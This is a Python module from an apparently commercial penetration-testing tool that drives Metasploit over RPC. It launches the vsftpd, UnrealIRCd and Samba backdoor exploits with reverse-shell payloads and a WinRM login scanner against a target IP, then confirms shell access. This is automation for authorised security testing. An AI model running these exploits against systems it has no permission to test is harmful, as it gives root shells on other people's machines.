# Copyright 2026 Athena Contributors
#
# Use of this software is governed by the Business Source License 1.1
# included in the LICENSE file.
#
# Change Date: Four years from release date of each version
# Change License: Apache License, Version 2.0
#
# For commercial licensing, contact: [TODO: contact email]

"""Metasploit RPC engine for Non-SSH initial access (ADR-019).

Connects to msfrpcd and executes exploit modules. Falls back to mock mode
when MOCK_METASPLOIT=true (default in CI/dev).

Supported:
  T1190 vsftpd 2.3.4 backdoor  -> exploit/unix/ftp/vsftpd_234_backdoor
  T1190 UnrealIRCd exploit      -> exploit/unix/irc/unreal_ircd_3281_backdoor
  T1190 Samba usermap_script    -> exploit/multi/samba/usermap_script
  T1021.001 WinRM               -> auxiliary/scanner/winrm/winrm_login
"""
import asyncio
import logging
from typing import Any, Callable

from app.config import settings

logger = logging.getLogger(__name__)

try:
    from pymetasploit3.msfrpc import MsfRpcClient
except ImportError:
    MsfRpcClient = None  # type: ignore[assignment,misc]

_EXPLOIT_MAP: dict[str, tuple[str, str]] = {
    "vsftpd": ("exploit/unix/ftp/vsftpd_234_backdoor", "cmd/unix/interact"),
    "unrealircd": ("exploit/unix/irc/unreal_ircd_3281_backdoor", "cmd/unix/reverse"),
    "samba": ("exploit/multi/samba/usermap_script", "cmd/unix/reverse"),
    "winrm": ("auxiliary/scanner/winrm/winrm_login", ""),
}

_MOCK_RESULT: dict[str, Any] = {
    "status": "success",
    "shell": "mock_shell_id_001",
    "output": "uid=0(root) gid=0(root) groups=0(root)",
    "engine": "metasploit_mock",
}


class MetasploitRPCEngine:
    """Execute Metasploit exploit modules via msfrpcd RPC API."""

    def _connect(self) -> Any:
        if MsfRpcClient is None:
            raise RuntimeError("pymetasploit3 not installed")
        return MsfRpcClient(
            settings.MSF_RPC_PASSWORD,
            server=settings.MSF_RPC_HOST,
            port=settings.MSF_RPC_PORT,
            username=settings.MSF_RPC_USER,
            ssl=settings.MSF_RPC_SSL,
        )

    def get_exploit_for_service(self, service_name: str) -> Callable | None:
        """Map service name to exploit method (case-insensitive substring match)."""
        s = service_name.lower()
        if "vsftpd" in s:
            return self.exploit_vsftpd
        if "unrealircd" in s or "unreal" in s:
            return self.exploit_unrealircd
        if "samba" in s or "smb" in s:
            return self.exploit_samba
        if "winrm" in s or "wsman" in s:
            return self.exploit_winrm
        return None

    async def _run_exploit(
        self, module_path: str, payload: str, options: dict[str, Any]
    ) -> dict[str, Any]:
        if settings.MOCK_METASPLOIT:
            logger.info(
                "[MOCK] MetasploitRPC: %s against %s",
                module_path,
                options.get("RHOSTS"),
            )
            return dict(_MOCK_RESULT, module=module_path)
        # Guard: LHOST=0.0.0.0 cannot receive reverse shell callbacks from target
        if payload and options.get("LHOST") == "0.0.0.0":
            logger.warning(
                "LHOST is 0.0.0.0; reverse shell payload may not receive callback. "
                "Set LHOST to the Athena host's reachable IP."
            )
        try:
            client = await asyncio.get_running_loop().run_in_executor(
                None, self._connect
            )
            # Capture pre-existing sessions to detect new ones
            pre_sessions: set = set(client.sessions.list.keys())

            module_type = "exploit" if module_path.startswith("exploit") else "auxiliary"
            exploit = client.modules.use(module_type, module_path)
            for k, v in options.items():
                exploit[k] = v
            if payload:
                exploit.execute(payload=payload)
            else:
                exploit.execute()
            for _ in range(30):
                await asyncio.sleep(1)
                sessions = client.sessions.list
                new_sessions = {k: v for k, v in sessions.items() if k not in pre_sessions}
                if new_sessions:
                    sid = list(new_sessions.keys())[0]
                    output = client.sessions.session(sid).run_with_output("id", timeout=5)
                    return {
                        "status": "success",
                        "shell": sid,
                        "output": output,
                        "engine": "metasploit",
                    }
            return {
                "status": "failed",
                "reason": "no session within 30s",
                "engine": "metasploit",
            }
        except Exception as exc:
            logger.exception("MetasploitRPC exploit failed: %s", module_path)
            return {"status": "failed", "reason": str(exc), "engine": "metasploit"}

    async def exploit_vsftpd(self, target_ip: str) -> dict[str, Any]:
        """Exploit vsftpd 2.3.4 backdoor (T1190) — bind shell, no LHOST needed."""
        module, payload = _EXPLOIT_MAP["vsftpd"]
        return await self._run_exploit(
            module, payload, {"RHOSTS": target_ip}
        )

    async def exploit_unrealircd(
        self, target_ip: str, lhost: str = "0.0.0.0"
    ) -> dict[str, Any]:
        """Exploit UnrealIRCd 3.2.8.1 backdoor (T1190)."""
        module, payload = _EXPLOIT_MAP["unrealircd"]
        return await self._run_exploit(
            module, payload, {"RHOSTS": target_ip, "LHOST": lhost}
        )

    async def exploit_samba(
        self, target_ip: str, lhost: str = "0.0.0.0"
    ) -> dict[str, Any]:
        """Exploit Samba usermap_script (T1190)."""
        module, payload = _EXPLOIT_MAP["samba"]
        return await self._run_exploit(
            module, payload, {"RHOSTS": target_ip, "LHOST": lhost}
        )

    async def exploit_winrm(
        self,
        target_ip: str,
        username: str = "administrator",
        password: str = "",
    ) -> dict[str, Any]:
        """WinRM credential login (T1021.001)."""
        module, _ = _EXPLOIT_MAP["winrm"]
        return await self._run_exploit(
            module,
            "",
            {"RHOSTS": target_ip, "USERNAME": username, "PASSWORD": password},
        )
